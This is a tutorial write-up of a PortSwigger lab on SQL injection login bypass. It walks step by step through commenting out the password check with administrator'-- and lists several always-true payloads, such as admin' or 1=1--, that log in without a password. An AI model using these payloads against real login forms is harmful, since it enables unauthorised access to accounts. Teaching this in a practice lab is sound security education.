# 03: SQL Injection Login Bypass

This time the injection is in the **login form**, and our goal is to log in as the **administrator** without knowing the password.

* **Lab:** [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

---

## Step 1: Guess the Query

A login form usually checks our credentials with a query like this:

```sql
SELECT * FROM users WHERE username = 'username' AND password = 'password'
```

If a matching row comes back, we're in. If not, we get "Invalid username or password."

The lab already hands us the username we want: **administrator**. So we don't need to guess it—we only need to get around the password check.

---

## Step 2: Confirm the Normal Behaviour

First, let's send a normal (wrong) login. I'll use `administrator` with a junk password like `0000`:

```sql
SELECT * FROM users WHERE username = 'administrator' AND password = '0000'
```

As expected, the server replies with **Invalid username or password**. Good—now we know what a failed attempt looks like.

---

## Step 3: Comment Out the Password Check

We don't know the password, so instead of guessing it, we simply **delete the password condition** from the query using the `--` comment we learned last lesson. We put it right after the username:

```
administrator'--
```

That turns the query into:

```sql
SELECT * FROM users WHERE username = 'administrator'-- AND password = '0000'
```

Everything after `--` is ignored, so the database only checks `username = 'administrator'`. That row exists, so the app logs us straight in as admin. Lab solved.

---

## Other Payloads That Work

The `--` trick is not the only one. A few other classic payloads in the username field also log us in as administrator, because they all make the condition evaluate to true:

```
administrator' or '1'='1
administrator' or '1'='1'--
administrator'or 1=1 or ''='
```

---

## Do We Even Need the Username?

Interesting question: **not always.** If we inject a condition that is always true, the whole `WHERE` clause becomes true regardless of the username and password. In that case the database returns the **first user in the table**, which is very often the administrator.

So payloads like these can get an attacker in with no valid username at all:

```
admin' or 1=1--
admin' or '1'='1'--
admin'or 1=1 or ''='
```

> This is why login forms should **never** build SQL by pasting user input into the query string. Even without a password, a single always-true condition can be enough.

---

## Solving the Lab

Pick any of the working payloads above in the username field, send the login request, and you're in as administrator. Read the lab instructions and submit. See ya next lesson, where we start pulling data out of *other* tables.
